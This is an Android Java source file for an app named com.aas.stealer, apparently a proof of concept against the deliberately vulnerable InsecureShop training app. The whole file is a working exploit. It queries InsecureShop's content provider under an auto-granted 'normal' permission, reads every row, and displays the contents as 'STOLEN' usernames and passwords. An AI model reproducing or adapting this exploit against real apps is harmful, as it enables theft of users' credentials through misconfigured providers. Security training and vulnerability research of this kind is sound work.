package com.aas.stealer;
import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.ScrollView;
import android.database.Cursor;
import android.net.Uri;
import android.graphics.Color;
import android.graphics.Typeface;
import android.util.TypedValue;
public class MainActivity extends Activity {
    protected void onCreate(Bundle st) {
        super.onCreate(st);
        StringBuilder sb = new StringBuilder();
        sb.append("attacker app : com.aas.stealer\n");
        sb.append("holds        : com.insecureshop.permission.READ (normal → auto-granted)\n\n");
        sb.append("query content://com.insecureshop.provider/insecure\n");
        sb.append("--------------------------------------------------\n");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.insecureshop.provider/insecure"),
                null, null, null, null);
            if (c == null) { sb.append("cursor = null (denied or no data)\n"); }
            else {
                sb.append("columns: ");
                for (String col : c.getColumnNames()) sb.append("[").append(col).append("] ");
                sb.append("\n\n");
                while (c.moveToNext()) {
                    sb.append("STOLEN username = ").append(c.getString(0)).append("\n");
                    sb.append("STOLEN password = ").append(c.getString(1)).append("\n");
                }
                c.close();
            }
        } catch (Throwable t) {
            sb.append("ERROR: ").append(t.getClass().getSimpleName()).append(": ").append(t.getMessage());
        }
        TextView tv = new TextView(this);
        tv.setText(sb.toString());
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        tv.setTextColor(Color.parseColor("#111111"));
        tv.setPadding(36, 60, 36, 36);
        tv.setTypeface(Typeface.MONOSPACE);
        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(Color.parseColor("#FFF4F4"));
        sv.addView(tv);
        setContentView(sv);
    }
}
